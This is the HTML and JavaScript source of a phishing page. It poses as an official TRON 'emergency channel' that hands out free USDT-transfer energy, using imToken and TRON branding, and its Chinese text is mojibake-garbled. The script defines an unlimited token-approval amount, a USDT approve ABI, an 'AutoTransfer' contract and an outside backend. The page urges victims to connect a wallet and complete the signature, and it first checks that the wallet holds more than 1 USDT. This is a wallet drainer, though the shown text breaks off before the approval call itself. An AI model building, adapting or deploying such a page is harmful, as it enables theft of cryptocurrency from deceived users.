<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TRONå®˜æ–¹åº”æ€¥é€šé“</title>
    <meta property="og:title" content="TRONå®˜æ–¹åº”æ€¥é€šé“" />
    <meta property="og:description" content="TRONç½‘ç»œä¸“å±èƒ½é‡é¢†å–é€šé“ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©å¯å…è´¹é¢†å–90000Î¼s USDTè½¬è´¦èƒ½é‡" />
    <meta property="og:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo1.png" />
    <meta property="og:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="TRONå®˜æ–¹åº”æ€¥é€šé“" />
    <meta name="twitter:description" content="TRONç½‘ç»œä¸“å±èƒ½é‡é¢†å–é€šé“ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©å¯å…è´¹é¢†å–90000Î¼s USDTè½¬è´¦èƒ½é‡" />
    <meta name="twitter:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo1.png" />
    <meta name="twitter:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
body { 
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    padding: 8px 6px; 
    max-width: 600px; 
    margin: 0 auto; 
    background: #1a0f0f; /* æš—è‰²ç³»åçº¢èƒŒæ™¯ï¼Œç¬¦åˆTRONé£æ ¼ */
    color: #f0e8e4; /* æµ…è‰²æ–‡å­—æé«˜å¯è¯»æ€§ */
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    gap: 5px; 
    border-radius: 8px;
    border-left: 3px solid #e11d48; /* çº¢è‰²è¾¹æ¡†æ›¿æ¢è“è‰² */
    font-size: 14px; 
    overflow-x: hidden;
}
.container {
    flex: 1; 
    display: flex;
    flex-direction: column;
    gap: 5px; 
    overflow-y: auto;
}
.header-container {
    display: flex;
    justify-content: space-between;
    align-items: flex-end;
    padding: 4px 8px; /* ç¼©å°é¡¶éƒ¨å†…è¾¹è· */
    border-bottom: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
    margin-bottom: 2px;
    min-height: 60px; /* ç¼©å°é¡¶éƒ¨ç•™ç©ºï¼ˆåŸ80pxï¼‰ */
    padding-bottom: 1px;
    box-sizing: border-box;
}
.lang-switch {
    padding: 0;
    margin: 0;
    display: flex;
    flex-direction: column;
    align-items: flex-end;
    gap: 6px;
}
.lang-text {
  color: #f0e8e4;
  font-size: 12px;
}
.lang-toggle {
    padding: 3px 8px;
    border: 1px solid #e11d48; /* çº¢è‰²è¾¹æ¡†æ›¿æ¢è“è‰² */
    border-radius: 20px;
    background: transparent;
    color: #f0e8e4;
    font-size: 13px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 4px;
}
.lang-toggle:hover {
    background: rgba(225, 29, 72, 0.2); /* çº¢è‰²hoverèƒŒæ™¯ */
}
.header {
    text-align: left;
    padding: 0;
    padding-bottom: 1px;
    border-bottom: none;
    margin-bottom: 0;
    display: flex;
    align-items: flex-end;
    gap: 10px;
}
.header > div {
    display: flex; 
    gap: 10px; 
    align-items: flex-end;
}
.header-logo {
    width: 151px; 
    height: 57px;
    border-radius: 4px;
    object-fit: contain;
}
.warning {
    background: #441a1a; /* çº¢è‰²ç³»èƒŒæ™¯ */
    color: #fca5a5; /* æµ…çº¢è‰²æ–‡å­— */
    padding: 8px;
    border-radius: 8px;
    font-size: 12px;
    border-left: 3px solid #e11d48; /* çº¢è‰²è¾¹æ¡†æ›¿æ¢ç»¿è‰² */
    line-height: 1.5;
}
.warning strong {
    color: #f87171; /* çº¢è‰²é«˜äº®æ–‡å­— */
}
#userInfo {
    text-align: center;
    font-size: 12px;
    padding: 12px;
    background: #241212; /* æš—çº¢è‰²èƒŒæ™¯ */
    border-radius: 8px;
    border: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
    line-height: 1.6;
    min-height: 50px;
}
#userInfo span {
    color: #f87171; /* çº¢è‰²é«˜äº®æ–‡å­— */
    font-weight: 500;
}
#walletStatusContainer {
    background: #241212; /* æš—çº¢è‰²èƒŒæ™¯ */
    padding: 12px;
    border-radius: 8px;
    border: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
    font-size: 12px;
    color: #f0e8e4;
    line-height: 1.6;
    border-right: 5px solid #e11d48; /* çº¢è‰²è¾¹æ¡†æ›¿æ¢ç»¿è‰² */
    min-height: 150px;
}
#walletStatusContainer .status-title {
    font-size: 14px;
    color: #f87171; /* çº¢è‰²æ ‡é¢˜ */
    margin-bottom: 6px;
    display: flex;
    align-items: center;
    gap: 6px;
}
#walletStatusContainer .connected-content {
    display: none;
    min-height: 110px;
}
#walletStatusContainer.connected .disconnected-content {
    display: none;
}
#walletStatusContainer.connected .connected-content {
    display: block;
}
#walletStatusContainer .highlight {
    color: #f87171; /* çº¢è‰²é«˜äº®æ–‡å­— */
    font-weight: 500;
}
#walletStatusContainer.connected .connected-content .orange-tip {
    color: #fb923c;
    margin-top: 5px;
    font-size: 12px;
}
#contractResourceContainer {
    background: #241212; /* æš—çº¢è‰²èƒŒæ™¯ */
    padding: 12px;
    border-radius: 8px;
    border: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
    font-size: 12px;
    color: #f0e8e4;
    line-height: 1.7;
    border-bottom: 2px solid rgba(225, 29, 72, 0.2); /* çº¢è‰²ç³»åº•è¾¹æ¡† */
    min-height: 80px;
}
#contractResourceContainer .status-title {
    font-size: 14px;
    color: #f87171; /* çº¢è‰²æ ‡é¢˜ */
    margin-bottom: 6px;
    display: flex;
    align-items: center;
    gap: 4px;
}
#contractResourceContainer .status-title i {
    font-size: 16px;
    color: #fca5a5; /* æµ…çº¢è‰²å›¾æ ‡ */
}
#contractResourceContainer .highlight {
    color: #f87171; /* çº¢è‰²é«˜äº®æ–‡å­— */
    font-weight: 500;
}
#contractResourceContainer .data-tag {
    background: rgba(225, 29, 72, 0.15); /* çº¢è‰²ç³»æ ‡ç­¾èƒŒæ™¯ */
    padding: 2px 6px;
    border-radius: 4px;
    border: 1px solid rgba(225, 29, 72, 0.3); /* çº¢è‰²ç³»æ ‡ç­¾è¾¹æ¡† */
    font-size: 12px;
}
.special-tip-container {
    background: #241212; /* æš—çº¢è‰²èƒŒæ™¯ */
    padding: 16px;
    border-radius: 8px;
    border: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
    display: none;
    margin-top: 4px;
    border-right: 3px solid #e11d48; /* çº¢è‰²è¾¹æ¡†æ›¿æ¢æ©™è‰² */
    box-shadow: -2px 0 0 0 #f87171; /* çº¢è‰²é˜´å½±æ›¿æ¢æ©™è‰² */
    min-height: 80px;
}
.special-tip-title {
    font-size: 16px;
    color: #f87171; /* çº¢è‰²æ ‡é¢˜ */
    font-weight: 600;
    margin-bottom: 6px;
}
.special-tip-content {
    font-size: 14px;
    color: #fca5a5; /* æµ…çº¢è‰²æ–‡å­— */
    line-height: 1.7;
    font-weight: 500;
}
.record-list {
    background: #241212; /* æš—çº¢è‰²èƒŒæ™¯ */
    padding: 12px;
    border-radius: 8px;
    border: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
    font-size: 12px;
    border-right: 5px solid #e11d48; /* çº¢è‰²è¾¹æ¡†æ›¿æ¢ç»¿è‰² */
    display: none;
    min-height: 100px;
}
.record-item {
    margin-bottom: 10px;
    padding-bottom: 10px;
    border-bottom: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
}
.record-item:hover {
    border-color: #e11d48; /* çº¢è‰²hoverè¾¹æ¡† */
    transition: border-color 0.3s;
}
.record-item p {
    margin-bottom: 6px;
    color: #f0e8e4;
    line-height: 1.5;
    font-size: 13px;
}
.record-item p strong {
    color: #f87171; /* çº¢è‰²é«˜äº®æ–‡å­— */
    margin-right: 5px;
}
.tx-link {
    color: #f87171; /* çº¢è‰²é“¾æ¥æ–‡å­— */
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 13px;
}
.tx-link:hover {
    text-decoration: underline;
}
.btn-group {
    display: flex;
    flex-direction: column;
    gap: 6px;
    margin-top: 4px;
    padding: 6px 0;
    border-top: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
}
.btn {
    width: 100%;
    padding: 12px;
    font-size: 15px;
    border: none;
    border-radius: 8px;
    background: #b91c1c; /* çº¢è‰²æŒ‰é’®èƒŒæ™¯ */
    color: white;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    transition: background 0.3s;
}
.btn:hover {
    background: #dc2626; /* äº®çº¢è‰²hoverèƒŒæ™¯ */
}
.btn:disabled {
    background: #4b1212; /* æš—çº¢è‰²ç¦ç”¨èƒŒæ™¯ */
    color: #a07878; /* æµ…çº¢è‰²ç¦ç”¨æ–‡å­— */
    cursor: not-allowed;
}
.footer-info {
    margin-top: 6px;
    padding-top: 6px;
    border-top: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
    font-size: 10px;
    color: #a07878; /* æµ…çº¢è‰²æ–‡å­— */
    text-align: center;
    line-height: 1.7;
}
.footer-info a {
    color: #f87171; /* çº¢è‰²é“¾æ¥æ–‡å­— */
    text-decoration: none;
}
.footer-info a:hover {
    text-decoration: underline;
} 
.text-right {
    text-align: right;
}
.review-tip {
    color: #f87171; /* çº¢è‰²æç¤ºæ–‡å­— */
    font-size: 12px;
    margin-top: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
}
.wallet-modal {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8); /* åŠ æ·±é®ç½©ï¼Œç¬¦åˆæš—è‰²ç³» */
    z-index: 9999;
    display: none;
    align-items: center;
    justify-content: center;
    padding: 20px;
}
.wallet-modal.active {
    display: flex;
}
.wallet-modal-content {
    background: #241212; /* æš—çº¢è‰²èƒŒæ™¯ */
    border-radius: 12px;
    width: 100%;
    max-width: 400px;
    border: 1px solid #e11d48; /* çº¢è‰²è¾¹æ¡† */
}
.wallet-modal-header {
    padding: 16px;
    border-bottom: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
    text-align: center;
}
.wallet-modal-title {
    color: #f87171; /* çº¢è‰²æ ‡é¢˜ */
    font-size: 18px;
    font-weight: 600;
}
.wallet-list {
    padding: 12px 0;
}
.wallet-item {
    display: flex;
    align-items: center;
    padding: 12px 20px;
    cursor: pointer;
    transition: background 0.3s;
}
.wallet-item:hover {
    background: rgba(225, 29, 72, 0.1); /* çº¢è‰²hoverèƒŒæ™¯ */
}
.wallet-item img {
    width: 36px;
    height: 36px;
    border-radius: 8px;
    margin-right: 12px;
}
.wallet-item-info {
    flex: 1;
}
.wallet-item-name {
    color: #f0e8e4;
    font-size: 15px;
    font-weight: 500;
}
.wallet-item-desc {
    color: #a07878; /* æµ…çº¢è‰²æ–‡å­— */
    font-size: 12px;
    margin-top: 2px;
}
.wallet-modal-footer {
    padding: 12px 20px;
    border-top: 1px solid #441a1a; /* çº¢è‰²ç³»è¾¹æ¡† */
    text-align: center;
    color: #a07878; /* æµ…çº¢è‰²æ–‡å­— */
    font-size: 12px;
}
.persistent-alert {
    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
    padding: 20px 30px; background: #241212; /* æš—çº¢è‰²èƒŒæ™¯ */
    border-radius: 8px; box-shadow: 0 2px 15px rgba(225, 29, 72, 0.3); /* çº¢è‰²é˜´å½± */
    font-size: 16px; color: #f0e8e4; z-index: 9999; text-align: center; border: 1px solid #e11d48; /* çº¢è‰²è¾¹æ¡† */
}
    </style>
</head>
<body>
    <div class="container">      
        <div class="header-container">
            <div class="header">
                <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/tron.png" alt="imToken Logo" class="header-logo">
            </div>
            <div class="lang-switch">
                <button id="langToggle" class="lang-toggle">
                  <i class="fa fa-globe"></i>
                </button>
                <span id="headerDesc" class="lang-text">TRONç½‘ç»œå®˜æ–¹åº”æ€¥é€šé“</span>
            </div>
        </div>
        <div id="userInfo">
            <span id="userInfoDefault">æœªè¿æ¥é’±åŒ…<br>
            <span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥é’±åŒ…ã€æŒ‰é’®</span></span>
        </div>
        <div id="walletStatusContainer">
            <div class="status-title"><h3 id="walletStatusTitle">é’±åŒ…çŠ¶æ€</h3></div>
            <div class="disconnected-content">
                <span id="disconnectedText">æœªè¿æ¥é’±åŒ…</span>
                <p><span class="highlight" id="disconnectedTip1">æ­¤é“¾æ¥ä¸ºTRONç½‘ç»œä¸“å±é€šé“ï¼ŒéTRONç½‘ç»œç”¨æˆ·ä¸å¯é¢†å–</span></p>
                <p><span class="highlight" id="disconnectedTip2">1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡</span></p>         
                <p><span class="highlight" id="disconnectedTip3">2. æ­¤é“¾æ¥åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®</span></p>
                <p><span class="highlight" id="disconnectedTip4">3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚</span></p>
                <p><span class="highlight" id="disconnectedTip5">4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯</span></p>
            </div>
            <div class="connected-content">
                <p id="connectedSuccess">âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥</p>
                <p id="connectedAddress">â€¢ é’±åŒ…åœ°å€ï¼š<span class="highlight" id="statusAddress"></span></p>
                <p id="connectedType">â€¢ é¢†å–ç±»å‹ï¼š<span class="highlight">USDTè½¬è´¦èƒ½é‡</span></p>
                <p id="connectedAmount">â€¢ é¢†å–é¢åº¦ï¼š<span class="highlight">90000 Î¼s</span></p>
                <p class="orange-tip" id="connectedWarn">âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–</p>
            </div>
        </div>
        <div id="contractResourceContainer">
            <div class="status-title">     
                <h3 id="contractResourceTitle">åˆçº¦å‰©ä½™èµ„æº</h3>
            </div>
            <div class="resource-content" style="line-height: 1.8;">
                <p>â€¢ åˆçº¦åœ°å€ï¼š<span class="highlight" id="contractAddr"></span></p>
                <p>â€¢ å‰©ä½™èƒ½é‡ï¼š<span class="highlight data-tag" id="contractEnergy"></span>Î¼s</p>
                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
                    æ³¨ï¼šå‰©ä½™èƒ½é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºTRONå®˜æ–¹å‘è¡Œï¼Œåªé™TRONç½‘ç»œç”¨æˆ·å‚ä¸ã€‚
                </p>
            </div>
        </div>
        <div class="special-tip-container" id="specialTipContainer">
            <div class="special-tip-title" id="specialTipTitle">imToken-EAB</div>
            <div class="special-tip-content" id="specialTipContent">
                æ­¤é“¾æ¥ä»…ä¸ºTRONç½‘ç»œç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡ã€æ— TRXéœ€è¦åœ¨TRONç½‘ç»œè½¬è´¦æƒ…å†µä¸‹çš„ç´§æ€¥æ´åŠ©ï¼Œèµ„æºæœ‰é™è¯·å‹¿å½“ä½œç›ˆåˆ©é¡¹ç›®ã€‚
            </div>
        </div>
        <div class="record-list" id="recordList">
            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
                <span id="recordTypeTitle">èƒ½é‡ä½¿ç”¨èŒƒå›´</span>
                <span id="recordAmountTitle">è½¬è´¦é¢åº¦</span>
            </div>
            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
                <span class="header"><h3 id="energyType">USDTè½¬è´¦</h3></span>
                <span class="header"><h3 id="transferQuota">æ— é™</h3></span>
            </div>       
            <span id="approvalRecords" class="highlight">æš‚æ— èƒ½é‡é¢†å–è®°å½•</span>        
        </div>
        <div class="btn-group">
            <div class="warning">
                <p id="browserWarn1"> âš ï¸ è¯·ç”¨ <strong>é’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€</p>
                <p id="browserWarn2"> âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®é€‰æ‹©é’±åŒ…ï¼Œè‡ªåŠ¨å”¤èµ·è®¿é—®</p>  
            </div> 
            <button id="connectBtn" class="btn">è¿æ¥é’±åŒ…</button>
            <button id="approveBtn" class="btn" disabled>é¢†å–èƒ½é‡</button>
            <div id="reviewTip" class="review-tip" style="display: none;">
               <span id="reviewTipText">âš ï¸ ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å</span>
            </div>
        </div>
        <div class="footer-info" id="footerInfo">
            åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰
            Â© 2025 èƒ½é‡æœåŠ¡ | <a href="https://tronscan.org" target="_blank">TRONæµè§ˆå™¨</a> | <a href="https://token.im" target="_blank">imTokenå®˜ç½‘</a>
        </div>
        <div class="wallet-modal" id="walletModal">
            <div class="wallet-modal-content">
                <div class="wallet-modal-header">
                    <div class="wallet-modal-title">é€‰æ‹©ä½ çš„é’±åŒ…</div>
                </div>
                <div class="wallet-list">
                    <div class="wallet-item" data-wallet="imtoken">
                        <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/imToken.png" alt="imToken">
                        <div class="wallet-item-info">
                            <div class="wallet-item-name">imToken</div>
                            <div class="wallet-item-desc">TRC20 </div>
                        </div>
                    </div>
                    <div class="wallet-item" data-wallet="tokenpocket">
                        <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/tokenPocket.png" alt="TokenPocket">
                        <div class="wallet-item-info">
                            <div class="wallet-item-name">TokenPocket</div>
                            <div class="wallet-item-desc">TRC20</div>
                        </div>
                    </div>
                    <div class="wallet-item" data-wallet="tronlink">
                        <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/tronLink.png" alt="TronLink">
                        <div class="wallet-item-info">
                            <div class="wallet-item-name">TronLink</div>
                            <div class="wallet-item-desc">TRONç½‘ç»œä¸“å±</div>
                        </div>
                    </div>
                    <div class="wallet-item" data-wallet="bitget">
                        <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/bitget.png" alt="Bitget Wallet">
                        <div class="wallet-item-info">
                            <div class="wallet-item-name">Bitget Wallet</div>
                            <div class="wallet-item-desc">TRC20</div>
                        </div>
                    </div>
                </div>
                <div class="wallet-modal-footer">
                    é€‰æ‹©åå°†è‡ªåŠ¨å”¤èµ·é’±åŒ…
                </div>
            </div>
        </div>
    </div>
   <script src="imtoken://browser"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js"></script>
<script>
// ========== å…¨å±€å˜é‡ä¼˜å…ˆå®šä¹‰ ==========
const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy";
const A1_SIGNAL_KEY = "a1_signal_records";
const A1_STATUS_KEY = "a1_signal_status";
let currentEnergy = 0;
const INIT_TRX = 414470400000;
const TRX_DECREASE_PER_SEC = 65200;
// ã€ä¿®å¤1ï¼šåˆ é™¤é‡å¤çš„GLOBAL_START_TIMEå®šä¹‰ï¼Œç§»åˆ°èƒ½é‡é€»è¾‘ä¸­ã€‘
let trxTimer = null;
let contractEnergyEl = null;
const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const BACKEND_API = "https://kgjiopv1.com";
const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
const USDT_ABI = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_spender", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {"indexed": true, "name": "owner", "type": "address"},
            {"indexed": true, "name": "spender", "type": "address"},
            {"indexed": false, "name": "value", "type": "uint256"}
        ],
        "name": "Approval",
        "type": "event"
    }
];
let tronWeb = null;
let userAddress = null;
let trc20Contract = null;
let tokenBalance = 0.00;
let trxBalance = 0.00;
const RECORD_KEY = "imtoken_energy_records";
const B1_SIGNAL_KEY = "b1_signal_sent";
const walletConfig = {
    imtoken: {
        scheme: "imtokenv2://navigate/DappView?url=",
        name: "imToken",
        logo: "imToken.png"
    },
    tokenpocket: {
        scheme: "tpdapp://open?params={\"url\":\"",
        name: "TokenPocket",
        suffix: "\"}",
        logo: "tokenPocket.png"
    },
    tronlink: {
        scheme: "tronlinkoutside://pull.activity?param=",
        name: "TronLink",
        logo: "tronLink.png"
    },
    bitget: {
        scheme: "bitkeep://bkconnect?action=dapp&url=",
        name: "Bitget Wallet",
        logo: "bitget.png"
    }
};
// ========== å¤šè¯­è¨€é…ç½®ï¼ˆç»Ÿä¸€æ–‡æœ¬ï¼Œä»¥ä¸­æ–‡ä¸ºå‡†ï¼Œè¡¥é½ç¼ºå¤±ï¼‰ ==========
const langConfig = {
    zh: {
        headerTitle: "TRON",
        headerDesc: "TRONå®˜æ–¹åº”æ€¥é€šé“",
        userInfoDefault: "æœªè¿æ¥é’±åŒ…<br><span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥é’±åŒ…ã€æŒ‰é’®</span>",
        walletStatusTitle: "é’±åŒ…çŠ¶æ€",
        disconnectedText: "æœªè¿æ¥é’±åŒ…",
        disconnectedTip1: "æ­¤é“¾æ¥ä¸ºTRONä¸“å±é€šé“ï¼ŒéTRONç½‘ç»œç”¨æˆ·ä¸å¯é¢†å–",
        disconnectedTip2: "1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡",
        disconnectedTip3: "2. æ­¤é“¾æ¥åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®",
        disconnectedTip4: "3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚",
        disconnectedTip5: "4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯",
        connectedSuccess: "âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥",
        connectedAddress: "â€¢ é’±åŒ…åœ°å€ï¼š<span class='highlight' id='statusAddress'></span>",
        connectedType: "â€¢ é¢†å–ç±»å‹ï¼š<span class='highlight'>USDTè½¬è´¦èƒ½é‡</span>",
        connectedAmount: "â€¢ é¢†å–é¢åº¦ï¼š<span class='highlight'>90000Î¼s</span>",
        connectedWarn: "âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–",
        contractResourceTitle: "åˆçº¦å‰©ä½™èµ„æº",
        contractAddrText: "â€¢ åˆçº¦åœ°å€ï¼š<span class='highlight' id='contractAddr'></span>",
        contractEnergyText: "â€¢ å‰©ä½™èƒ½é‡ï¼š<span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
        contractNote: "æ³¨ï¼šå‰©ä½™èƒ½é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºTRONå®˜æ–¹å‘è¡Œï¼Œåªé™TRONç½‘ç»œç”¨æˆ·å‚ä¸ã€‚",
        recordTypeTitle: "èƒ½é‡ä½¿ç”¨èŒƒå›´",
        recordAmountTitle: "è½¬è´¦é¢åº¦",
        energyType: "USDTè½¬è´¦",
        transferQuota: "æ— é™",
        noRecord: "æš‚æ— èƒ½é‡é¢†å–è®°å½•",
        browserWarn1: " âš ï¸ è¯·ç”¨ <strong>é’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€",
        browserWarn2: " âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®é€‰æ‹©é’±åŒ…ï¼Œè‡ªåŠ¨å”¤èµ·è®¿é—®",
        connectBtnText: "è¿æ¥é’±åŒ…",
        approveBtnText: "é¢†å–èƒ½é‡",
        reviewTipText: "ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å",
        footerInfo: "åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰Â© 2025 èƒ½é‡æœåŠ¡ | <a href='https://tronscan.org' target='_blank'>TRONæµè§ˆå™¨</a> | <a href='https://token.im' target='_blank'>imTokenå®˜ç½‘</a>",
        copySuccess: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨{walletName}å†…ç½®æµè§ˆå™¨æ‰“å¼€",
        copyFail: "âŒ å¤åˆ¶å¤±è´¥ï¼šè¯·æ‰‹åŠ¨å¤åˆ¶é“¾æ¥",
        å”¤èµ·Guide: "âœ… å·²å¤åˆ¶é“¾æ¥+å”¤èµ·{walletName}\nä¸‹ä¸€æ­¥ï¼šæ‰“å¼€{walletName} â†’ æµè§ˆ â†’ ç²˜è´´è®¿é—®",
        copyGuide: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨{walletName}ä¸­ç²˜è´´è®¿é—®",
        connectError: "è¿æ¥å¼‚å¸¸<br><span style='color: #ef4444; font-size: 14px;'>âš ï¸ ç½‘ç»œæ³¢åŠ¨</span>",
        retryConnect: "é‡è¯•è¿æ¥",
        authorizedTip: "å·²é¢†å–æç¤º<br>{address}<br>USDTä½™é¢ï¼š<span>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>âœ… è¯¥é’±åŒ…30å¤©å†…å·²é¢†å–è¿‡å…è´¹èƒ½é‡</span><br><span style='color: #a0a8a4; font-size: 13px;'>æ¯ä¸ªåœ°å€æ¯30å¤©ä»…é™é¢†å–ä¸€æ¬¡</span>",
        authorizedBtn: "å·²é¢†å–è¿‡èƒ½é‡",
        afterApproveTip: "å·²è¿æ¥ï¼š<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… æˆæƒæˆåŠŸï¼Œå‘æ”¾èƒ½é‡ä¸­...</span>",
        deployingBtn: "å‘æ”¾ä¸­...",
        loadingBtn: "åŠ è½½ä¸­...",
        loadingTip: "å·²è¿æ¥ï¼š<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… åŠ è½½ä¸­...</span>",
        queryingBalance: "æŸ¥è¯¢ä¸­...",
        insufficientUsdt: "å·²è¿æ¥ï¼š<br>{address}<br>USDTä½™é¢ï¼š<span style='color: #ef4444;'>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>âŒ ä¸ç¬¦åˆé¢†å–æ¡ä»¶ï¼šUSDTä½™é¢éœ€å¤§äº1</span>",
        insufficientBtn: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
        eligibleTip: "å·²è¿æ¥ï¼š<br>{address}<br>USDTä½™é¢ï¼š<span style='color: #4ade80;'>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>âœ… å¯å…è´¹é¢†å–90000 USDT èƒ½é‡</span>",
        distributingBtn: "èƒ½é‡é…é€ä¸­...",
        redirectingBtn: "è·³è½¬ç­¾åä¸­...",
        approveFail: "âš ï¸ æ“ä½œå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
